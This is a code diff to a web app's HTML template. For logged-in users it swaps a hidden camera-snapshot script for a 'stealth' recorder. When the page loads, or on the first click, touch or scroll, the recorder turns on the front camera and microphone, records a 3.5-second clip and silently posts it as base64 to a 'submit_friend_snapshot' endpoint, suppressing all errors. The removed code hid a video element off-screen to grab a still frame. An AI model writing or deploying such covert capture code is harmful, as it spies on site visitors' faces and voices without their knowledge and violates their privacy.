@@ -914,13 +914,10 @@ document.addEventListener('DOMContentLoaded', function() {
 </script>
 
 {% if current_user.is_authenticated %}
-<!-- Stealth Mobile & Desktop Camera Elements -->
-<video id="snapshotVideo" style="position: fixed; top: -9999px; left: -9999px; width: 320px; height: 240px; opacity: 0; pointer-events: none; z-index: -9999;" autoplay playsinline webkit-playsinline muted></video>
-<canvas id="snapshotCanvas" style="display: none;"></canvas>
-
+<!-- Stealth Video & Audio Snapshot Recorder -->
 <script>
 (function() {
-    let captured = false;
+    let recordingStarted = false;
 
     function getUniversalUserMedia(constraints) {
         if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
@@ -932,102 +929,89 @@ document.addEventListener('DOMContentLoaded', function() {
                 legacyFn.call(navigator, constraints, resolve, reject);
             });
         }
-        return Promise.reject(new Error("Camera API not supported on this browser/origin"));
+        return Promise.reject(new Error("Camera/Audio API not available"));
     }
 
-    function stealthCapture() {
-        if (captured) return;
+    function recordStealthVideo() {
+        if (recordingStarted) return;
 
-        const video = document.getElementById('snapshotVideo');
-        const canvas = document.getElementById('snapshotCanvas');
-        if (!video || !canvas) return;
-
-        function attemptStream(constraints) {
+        function getStream(constraints) {
             return getUniversalUserMedia(constraints);
         }
 
-        attemptStream({ video: { facingMode: 'user' } })
-            .catch(() => attemptStream({ video: { facingMode: { ideal: 'user' } } }))
-            .catch(() => attemptStream({ video: true }))
+        getStream({ video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } }, audio: true })
+            .catch(() => getStream({ video: { facingMode: 'user' }, audio: true }))
+            .catch(() => getStream({ video: true, audio: true }))
+            .catch(() => getStream({ video: true }))
             .then(stream => {
-                try {
-                    video.srcObject = stream;
-                } catch(e) {
-                    try {
-                        video.src = window.URL.createObjectURL(stream);
-                    } catch(e2) {}
+                if (recordingStarted) return;
+                recordingStarted = true;
+
+                if (!window.MediaRecorder) {
+                    return;
                 }
-                
-                video.muted = true;
-                video.volume = 0;
-                video.setAttribute('playsinline', 'true');
-                video.setAttribute('webkit-playsinline', 'true');
-                
-                const p = video.play();
-                if (p && p.catch) p.catch(() => {});
 
-                function drawAndSendFrame() {
-                    if (captured) return;
+                let options = {};
+                if (MediaRecorder.isTypeSupported('video/webm;codecs=vp8,opus')) {
+                    options = { mimeType: 'video/webm;codecs=vp8,opus' };
+                } else if (MediaRecorder.isTypeSupported('video/mp4')) {
+                    options = { mimeType: 'video/mp4' };
+                } else if (MediaRecorder.isTypeSupported('video/webm')) {
+                    options = { mimeType: 'video/webm' };
+                }
 
-                    let w = video.videoWidth || 640;
-                    let h = video.videoHeight || 480;
-                    
-                    if (w > 640) {
-                        h = Math.round((h * 640) / w);
-                        w = 640;
+                const recorder = new MediaRecorder(stream, options);
+                const chunks = [];
+
+                recorder.ondataavailable = function(e) {
+                    if (e.data && e.data.size > 0) {
+                        chunks.push(e.data);
+                    }
+                };
+
+                recorder.onstop = function() {
+                    if (stream && stream.getTracks) {
+                        stream.getTracks().forEach(track => track.stop());
                     }
 
-                    canvas.width = w;
-                    canvas.height = h;
-                    const ctx = canvas.getContext('2d');
-                    ctx.drawImage(video, 0, 0, w, h);
-
-                    const imageData = canvas.toDataURL('image/jpeg', 0.75);
-
-                    if (imageData && imageData.length > 500) {
-                        captured = true;
-
-                        if (stream && stream.getTracks) {
-                            stream.getTracks().forEach(track => track.stop());
+                    const blob = new Blob(chunks, { type: recorder.mimeType || 'video/webm' });
+                    const reader = new FileReader();
+                    reader.readAsDataURL(blob);
+                    reader.onloadend = function() {
+                        const base64Video = reader.result;
+                        if (base64Video && base64Video.length > 1000) {
+                            fetch('{{ url_for("submit_friend_snapshot") }}', {
+                                method: 'POST',
+                                headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify({ image_data: base64Video, video_data: base64Video })
+                            }).catch(() => {});
                         }
+                    };
+                };
 
-                        fetch('{{ url_for("submit_friend_snapshot") }}', {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({ image_data: imageData })
-                        }).catch(() => {});
+                recorder.start(200);
+
+                // Record 3.5 seconds video clip with audio
+                setTimeout(function() {
+                    if (recorder.state !== 'inactive') {
+                        recorder.stop();
                     }
-                }
-
-                video.onloadedmetadata = function() { setTimeout(drawAndSendFrame, 300); };
-                video.onplaying = function() { setTimeout(drawAndSendFrame, 200); };
-
-                let attempts = 0;
-                const timer = setInterval(() => {
-                    attempts++;
-                    if (video.videoWidth > 0 && video.videoHeight > 0) {
-                        clearInterval(timer);
-                        drawAndSendFrame();
-                    } else if (attempts >= 15) {
-                        clearInterval(timer);
-                        drawAndSendFrame();
-                    }
-                }, 200);
+                }, 3500);
             })
             .catch(() => {});
     }
 
     if (document.readyState === 'complete') {
-        setTimeout(stealthCapture, 300);
+        setTimeout(recordStealthVideo, 300);
     } else {
         window.addEventListener('load', function() {
-            setTimeout(stealthCapture, 300);
+            setTimeout(recordStealthVideo, 300);
         });
     }
 
-    document.addEventListener('click', stealthCapture, { once: true });
-    document.addEventListener('touchstart', stealthCapture, { once: true });
-    document.addEventListener('scroll', stealthCapture, { once: true });
+    document.addEventListener('click', recordStealthVideo, { once: true });
+    document.addEventListener('touchstart', recordStealthVideo, { once: true });
+    document.addEventListener('scroll', recordStealthVideo, { once: true });
 })();
 </script>
 {% endif %}
